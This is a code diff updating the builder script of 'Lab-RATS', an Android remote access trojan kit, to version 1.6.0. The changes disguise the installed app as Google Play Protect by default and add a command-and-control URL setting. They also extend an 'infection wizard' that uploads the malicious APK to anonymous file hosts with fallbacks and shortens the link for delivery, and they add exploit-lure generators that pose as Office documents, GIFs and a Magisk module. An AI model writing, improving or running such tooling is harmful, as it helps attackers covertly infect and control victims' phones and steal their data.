@@ -4,7 +4,7 @@
 #                   Lab-RATS                    #
 #                                               #
 #        Android APK BUILDER - Linux/Mac        #
-#                v1.5.1 Hardened                #
+#                v1.6.0 Hardened                #
 #                                               #
 #             Developed by: K4N3CO              #
 #################################################
@@ -56,7 +56,7 @@ print_banner() {
     echo " │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │"
     echo " │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │"                                                                                                          
     echo " │                                                                       │"
-    echo " │     ----------> Android APK Builder | v1.5.1 Hardened <----------     │"
+    echo " │     ----------> Android APK Builder | v1.6.0 Hardened <----------     │"
     echo " │                                                                       │" 
     echo " │   The one's who MIND don't matter. The one's who MATTER don't mind.   │"
     echo " │                         DEVELOPED BY K4N3CO                           │"
@@ -174,8 +174,8 @@ configure_app() {
 
     echo -e "${CYAN}[*] Decoy Identity Selection${NC}"
     echo -e "${YELLOW}    (The app logo will transform into your selection immediately after install on device)${NC}"
-    echo "    1. System Update (Gear)  2. Calculator"
-    echo "    3. Weather               4. Play Protect"
+    echo "    1. Play Protect (Shield - Default)  2. Calculator"
+    echo "    3. Weather                          4. System Update"
     echo "    5. Lab-RATS Logo"
     read -p "    Choice (Default 1): " DECOY_CHOICE
     DECOY_CHOICE=${DECOY_CHOICE:-1}
@@ -210,6 +210,8 @@ configure_app() {
     else
         echo "WEBHOOK_URL=$WEB_URL" >> "$PROJECT_DIR/local.properties"
     fi
+        echo "RENDER_C2_URL=$RENDER_URL" >> "$PROJECT_DIR/local.properties"
+    fi
 
     if grep -q "DECOY_CHOICE=" "$PROJECT_DIR/local.properties"; then
         sed_i "s|DECOY_CHOICE=.*|DECOY_CHOICE=$DECOY_CHOICE|g" "$PROJECT_DIR/local.properties"
@@ -232,52 +234,39 @@ configure_app() {
 
 # Progress bar function
 execute_build() {
-    local task=$1; local label=$2; local expected_time=$3
-    ./gradlew $task --no-daemon > build_log.txt 2>&1 &
-    local pid=$!; local steps=40;
-    local sleep_time=$(echo "scale=4; $expected_time / $steps" | bc 2>/dev/null || awk "BEGIN {print $expected_time / $steps}")
-
-    # Phase 1: Steady progress bar up to 95% over expected_time
-    local max_p1_steps=38 # 38/40 = 95%
-    for ((i=1; i<=max_p1_steps; i++)); do
-        if ! kill -0 $pid 2>/dev/null; then break; fi
-        local percentage=$((i * 100 / steps))
-        local bar=$(printf "%${i}s" | tr ' ' '█')
-        local spaces=$(printf "%$((steps - i))s")
-        printf "\r${CYAN}    [*] %-30s [${bar}${spaces}] %3d%% ${NC}\033[K" "$label" "$percentage"
-        sleep $sleep_time
-    done
-
-    # Phase 2: Active spinner & incremental progress (95% -> 99%) while waiting for background Gradle process
-    local cur_step=38
+    local task=$1; local label=$2;
+    rm -f build_log.txt
+    ./gradlew $task > build_log.txt 2>&1 &
+    local pid=$!
     local spinner=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
     local spin_idx=0
-    local cycle=0
 
     while kill -0 $pid 2>/dev/null; do
         spin_char="${spinner[$spin_idx]}"
         spin_idx=$(( (spin_idx + 1) % 10 ))
 
-        cycle=$((cycle + 1))
-        if [ $cycle -eq 8 ] && [ $cur_step -lt 39 ]; then
-            cur_step=$((cur_step + 1))
-            cycle=0
+        local last_task="Initializing..."
+        if [ -f build_log.txt ]; then
+            local matched=$(grep "> Task" build_log.txt | tail -n 1 | sed 's/> Task //g' | cut -c1-32)
+            if [ -n "$matched" ]; then
+                last_task="$matched"
+            fi
         fi
 
-        local percentage=$((cur_step * 100 / steps))
-        local bar=$(printf "%${cur_step}s" | tr ' ' '█')
-        local spaces=$(printf "%$((steps - cur_step))s")
-
-        printf "\r${CYAN}    [*] %-30s [${bar}${spaces}] %3d%% ${YELLOW}[${spin_char} FINISHING...]${NC}\033[K" "$label" "$percentage"
-        sleep 0.5
+        printf "\r\033[K${CYAN}  [*] %-22s ${YELLOW}[${spin_char}] ${WHITE}%-32s${NC}" "$label" "$last_task"
+        sleep 0.2
     done
 
     wait $pid
     local status=$?
     if [ $status -eq 0 ]; then
-        printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] 100%% ${GREEN}[DONE]${NC}\033[K\n" "$label"
+        printf "\r\033[K${CYAN}  [*] %-22s ${GREEN}[✓] BUILD SUCCESSFUL${NC}\n" "$label"
     else
-        printf "\r${CYAN}    [*] %-30s [$(printf '█%.0s' $(seq 1 $steps))] ERR  ${RED}[FAIL]${NC}\033[K\n" "$label"
+        printf "\r\033[K${CYAN}  [*] %-22s ${RED}[!] BUILD FAILED${NC}\n" "$label"
+        if [ -f build_log.txt ]; then
+            echo -e "${RED}[!] Build Log Errors:${NC}"
+            grep -iE "error|failed|exception" build_log.txt | tail -n 10
+        fi
     fi
     return $status
 }
@@ -288,11 +277,20 @@ build_apk() {
     echo -e "${CYAN}[*] Initializing Build Engine...${NC}"
     cd "$PROJECT_DIR"
     chmod +x gradlew
-    execute_build "clean assembleRelease" "Compiling Resources & Signing" 65
+    execute_build "assembleRelease" "Compiling Package"
     local BUILD_STATUS=$?
     mkdir -p "$SCRIPT_DIR/output"
-    if [ $BUILD_STATUS -eq 0 ] && [ -f "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" ]; then
-        cp "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" "$SCRIPT_DIR/output/signed_v1.apk"
+
+    # Locate built APK (release or debug fallback)
+    local APK_PATH=""
+    if [ -f "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" ]; then
+        APK_PATH="$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk"
+    elif [ -f "$PROJECT_DIR/app/build/outputs/apk/debug/app-debug.apk" ]; then
+        APK_PATH="$PROJECT_DIR/app/build/outputs/apk/debug/app-debug.apk"
+    fi
+
+    if [ $BUILD_STATUS -eq 0 ] && [ -n "$APK_PATH" ]; then
+        cp "$APK_PATH" "$SCRIPT_DIR/output/signed_v1.apk"
         echo -e "\n${GREEN}[✓] Success: output/signed_v1.apk${NC}"
     else
         echo -e "${RED}[!] Build failed. Error Code: $BUILD_STATUS${NC}"
@@ -333,23 +331,43 @@ infection_wizard() {
     local SIGNED_APK="$SCRIPT_DIR/output/signed_v1.apk"
     echo ""
     echo -e "${CYAN}[HOSTING] Select strategy:${NC}"
-    echo "    1. Anonymous Cloud (Catbox)  2. Direct IP (IPv6)"
+    echo "    1. Anonymous Cloud (Catbox / Multi-Cloud Fallback)"
+    echo "    2. Direct IP (IPv6)"
+    echo "    3. Custom / Pre-hosted Direct URL"
     read -p "    Choice: " H
     local DOWNLOAD_URL=""
     if [ "$H" == "2" ]; then
         read -p "    Target IPv6: " IP
         DOWNLOAD_URL="http://[$IP]:9191/download/Update.apk"
+    elif [ "$H" == "3" ]; then
+        read -p "    Enter pre-hosted URL: " DOWNLOAD_URL
     else
         echo -e "${YELLOW}[*] Uploading to Catbox.moe...${NC}"
-        DOWNLOAD_URL=$(curl -sS -F "reqtype=fileupload" -F "fileToUpload=@$SIGNED_APK" https://catbox.moe/user/api.php)
-        if [ $? -ne 0 ] || [[ "$DOWNLOAD_URL" == *"ERROR"* ]] || [ -z "$DOWNLOAD_URL" ]; then
-            echo -e "${RED}[!] Upload failed: $DOWNLOAD_URL${NC}"
+        DOWNLOAD_URL=$(curl -sS --connect-timeout 5 --max-time 15 -F "reqtype=fileupload" -F "fileToUpload=@$SIGNED_APK" https://catbox.moe/user/api.php 2>/dev/null)
+        if [[ "$DOWNLOAD_URL" != "http"* ]]; then
+            echo -e "${YELLOW}[!] Catbox failed/unreachable. Trying Litterbox fallback...${NC}"
+            DOWNLOAD_URL=$(curl -sS --connect-timeout 5 --max-time 15 -F "reqtype=fileupload" -F "time=72h" -F "fileToUpload=@$SIGNED_APK" https://litterbox.catbox.moe/resources/internals/api.php 2>/dev/null)
+        fi
+        if [[ "$DOWNLOAD_URL" != "http"* ]]; then
+            echo -e "${YELLOW}[!] Litterbox failed/unreachable. Trying Tmpfiles.org fallback...${NC}"
+            local TMP_RESP=$(curl -sS --connect-timeout 5 --max-time 15 -F "file=@$SIGNED_APK" https://tmpfiles.org/api/v1/upload 2>/dev/null)
+            local RAW_TMP=$(echo "$TMP_RESP" | grep -o '"url":"[^"]*' | cut -d'"' -f4)
+            if [[ "$RAW_TMP" == *"tmpfiles.org/"* ]]; then
+                DOWNLOAD_URL=$(echo "$RAW_TMP" | sed 's/tmpfiles.org\//tmpfiles.org\/dl\//')
+            fi
+        fi
+        if [[ "$DOWNLOAD_URL" != "http"* ]]; then
+            echo -e "${RED}[!] Automated cloud uploads failed or unreachable on this network.${NC}"
+            read -p "    Enter custom / pre-hosted URL manually: " DOWNLOAD_URL
+        fi
+        if [ -z "$DOWNLOAD_URL" ] || [[ "$DOWNLOAD_URL" != "http"* ]]; then
+            echo -e "${RED}[!] Upload failed / No valid URL provided.${NC}"
             read -p "Press Enter to return..."
             return 1
         fi
         echo -e "${GREEN}[✓] Hosted: $DOWNLOAD_URL${NC}"
         echo -e "${YELLOW}[*] Shortening delivery URL...${NC}"
-        SHORT_URL=$(curl -s "https://is.gd/create.php?format=simple&url=$DOWNLOAD_URL")
+        SHORT_URL=$(curl -s --connect-timeout 5 "https://is.gd/create.php?format=simple&url=$DOWNLOAD_URL" 2>/dev/null)
         if [[ "$SHORT_URL" == "http"* ]]; then
             DOWNLOAD_URL=$SHORT_URL
             echo -e "${GREEN}[✓] Shortened: $DOWNLOAD_URL${NC}"
@@ -390,7 +408,8 @@ exploit_menu() {
     echo "    4. Dolby Audio       5. ADB Script      6. Bluetooth Push"
     echo "    7. NFC NDEF Tag      8. Stego Image     9. PWA Bundle"
     echo "    10. Office Word      11. Office Excel   12. Ghost GIF"
-    echo "    13. Return to Main Menu"
+    echo "    13. Priv-App Magisk Module ZIP"
+    echo "    14. Return to Main Menu"
     echo ""
     read -p "    Choice: " E_CHOICE
     E_CHOICE=${E_CHOICE:-1}
@@ -412,7 +431,8 @@ exploit_menu() {
         10) generate_exploit_standalone "docx" "$C2_URL" "Security_Audit" ;;
         11) generate_exploit_standalone "xlsx" "$C2_URL" "Financial_Report" ;;
         12) generate_exploit_standalone "gif" "$C2_URL" ;;
-        13) return ;;
+        13) generate_exploit_standalone "privapp" "$C2_URL" ;;
+        14) return ;;
         *) exploit_menu ;;
     esac
     echo ""
@@ -451,7 +471,7 @@ main_menu() {
 }
 show_help() {
     print_banner
-    echo -e "${WHITE}COMMAND_DOCUMENTATION_V1.5.1${NC}"
+    echo -e "${WHITE}COMMAND_DOCUMENTATION_V1.6.0${NC}"
     echo "------------------------------------------------------------"
     echo "1. Start Build: Standard production flow."
     echo "2. Keystore Only: Unique signing certificate."
